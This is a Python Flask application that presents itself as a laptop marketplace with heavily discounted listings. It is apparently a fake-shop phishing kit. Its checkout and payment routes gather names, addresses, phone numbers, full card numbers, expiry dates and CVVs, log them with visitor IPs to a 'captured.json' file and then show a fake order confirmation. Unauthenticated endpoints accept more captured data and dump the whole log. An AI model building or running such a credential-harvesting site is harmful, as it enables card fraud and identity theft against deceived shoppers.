import json
import os
import uuid
from datetime import datetime

from flask import Flask, jsonify, redirect, render_template, request, session, url_for
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = "marketplace-hub-secret-2024"
CORS(app)

LOGS_DIR = os.path.join(os.path.dirname(__file__), "logs")
os.makedirs(LOGS_DIR, exist_ok=True)
CAPTURED_LOG = os.path.join(LOGS_DIR, "captured.json")

LISTINGS = [
    {
        "id": 1,
        "title": "MacBook Pro 14\" M3",
        "price": 899,
        "market_price": 1599,
        "seller": "Alex_Techsells",
        "rating": 5,
        "reviews": 47,
        "condition": "Excellent",
        "description": "MacBook Pro 14-inch with M3 chip, 16GB RAM, 512GB SSD. Like new condition, original box included. Minor cosmetic marks only.",
        "specs": ["M3 Chip (8-core CPU)", "16GB Unified Memory", "512GB SSD", "14.2\" Liquid Retina XDR", "macOS Sonoma"],
        "image": "macbook.svg",
        "badge": "Featured",
        "ships_from": "San Francisco, CA",
        "posted": "2 days ago",
    },
    {
        "id": 2,
        "title": "ThinkPad X1 Carbon Gen 11",
        "price": 449,
        "market_price": 1299,
        "seller": "LaptopDealsUSA",
        "rating": 5,
        "reviews": 83,
        "condition": "Good",
        "description": "Lenovo ThinkPad X1 Carbon, 13th Gen Intel Core i7, 16GB RAM, 512GB NVMe SSD. Business laptop in great working condition.",
        "specs": ["Intel Core i7-1365U", "16GB LPDDR5", "512GB NVMe SSD", "14\" IPS FHD+", "Windows 11 Pro"],
        "image": "thinkpad.svg",
        "badge": "Hot Deal",
        "ships_from": "Austin, TX",
        "posted": "5 hours ago",
    },
    {
        "id": 3,
        "title": "Dell XPS 15 9530",
        "price": 549,
        "market_price": 1199,
        "seller": "QuickSell_Mark",
        "rating": 5,
        "reviews": 29,
        "condition": "Very Good",
        "description": "Dell XPS 15 with OLED display, Intel i7-13700H, 32GB RAM, 1TB SSD. Purchased last year, barely used. Perfect for creative work.",
        "specs": ["Intel Core i7-13700H", "32GB DDR5 RAM", "1TB NVMe SSD", "15.6\" OLED 3.5K", "NVIDIA RTX 4060"],
        "image": "dellxps.svg",
        "badge": "Best Value",
        "ships_from": "Chicago, IL",
        "posted": "1 day ago",
    },
]


def log_captured(data: dict):
    entries = []
    if os.path.exists(CAPTURED_LOG):
        try:
            with open(CAPTURED_LOG, "r") as f:
                entries = json.load(f)
        except Exception:
            entries = []
    entries.append({"timestamp": datetime.utcnow().isoformat(), **data})
    with open(CAPTURED_LOG, "w") as f:
        json.dump(entries, f, indent=2)


@app.route("/")
def index():
    return render_template("index.html", listings=LISTINGS)


@app.route("/listing/<int:listing_id>")
def listing(listing_id):
    item = next((l for l in LISTINGS if l["id"] == listing_id), None)
    if not item:
        return redirect(url_for("index"))
    return render_template("listing.html", item=item)


@app.route("/checkout/<int:listing_id>", methods=["GET", "POST"])
def checkout(listing_id):
    item = next((l for l in LISTINGS if l["id"] == listing_id), None)
    if not item:
        return redirect(url_for("index"))

    if request.method == "POST":
        shipping = {
            "full_name": request.form.get("full_name", ""),
            "email": request.form.get("email", ""),
            "address": request.form.get("address", ""),
            "city": request.form.get("city", ""),
            "state": request.form.get("state", ""),
            "zip_code": request.form.get("zip_code", ""),
            "phone": request.form.get("phone", ""),
        }
        session["shipping"] = shipping
        session["listing_id"] = listing_id
        session["order_id"] = str(uuid.uuid4())[:8].upper()

        log_captured({
            "step": "shipping",
            "listing_id": listing_id,
            "listing_title": item["title"],
            "fields": shipping,
            "url": request.url,
            "ip": request.remote_addr,
        })

        return redirect(url_for("payment"))

    return render_template("checkout.html", item=item, step=1)


@app.route("/payment", methods=["GET", "POST"])
def payment():
    listing_id = session.get("listing_id")
    item = next((l for l in LISTINGS if l["id"] == listing_id), None) if listing_id else None
    shipping = session.get("shipping", {})
    order_id = session.get("order_id", "ORD-XXXXX")

    if not item:
        return redirect(url_for("index"))

    if request.method == "POST":
        payment_data = {
            "card_number": request.form.get("card_number", ""),
            "expiry": request.form.get("expiry", ""),
            "cvv": request.form.get("cvv", ""),
            "cardholder_name": request.form.get("cardholder_name", ""),
            "billing_address": request.form.get("billing_address", ""),
            "billing_city": request.form.get("billing_city", ""),
            "billing_state": request.form.get("billing_state", ""),
            "billing_zip": request.form.get("billing_zip", ""),
        }

        log_captured({
            "step": "payment",
            "listing_id": listing_id,
            "listing_title": item["title"] if item else "Unknown",
            "order_id": order_id,
            "shipping": shipping,
            "payment": payment_data,
            "url": request.url,
            "ip": request.remote_addr,
        })

        session["payment_complete"] = True
        return redirect(url_for("confirmation"))

    return render_template("payment.html", item=item, shipping=shipping, order_id=order_id)


@app.route("/confirmation")
def confirmation():
    if not session.get("payment_complete"):
        return redirect(url_for("index"))
    order_id = session.get("order_id", "ORD-XXXXX")
    listing_id = session.get("listing_id")
    item = next((l for l in LISTINGS if l["id"] == listing_id), None) if listing_id else None
    shipping = session.get("shipping", {})
    session.clear()
    return render_template("confirmation.html", order_id=order_id, item=item, shipping=shipping)


@app.route("/api/captured", methods=["POST"])
def api_captured():
    data = request.get_json(silent=True) or {}
    data["source"] = "api"
    data["url"] = request.headers.get("Referer", "")
    data["ip"] = request.remote_addr
    log_captured(data)
    return jsonify({"status": "ok"})


@app.route("/api/captured", methods=["GET"])
def get_captured():
    entries = []
    if os.path.exists(CAPTURED_LOG):
        try:
            with open(CAPTURED_LOG, "r") as f:
                entries = json.load(f)
        except Exception:
            entries = []
    return jsonify({"entries": entries})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    with open(CAPTURED_LOG, "w") as f:
        json.dump([], f)
    return jsonify({"status": "ok"})


@app.route("/api/listings")
def api_listings():
    return jsonify(LISTINGS)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5052, debug=False)
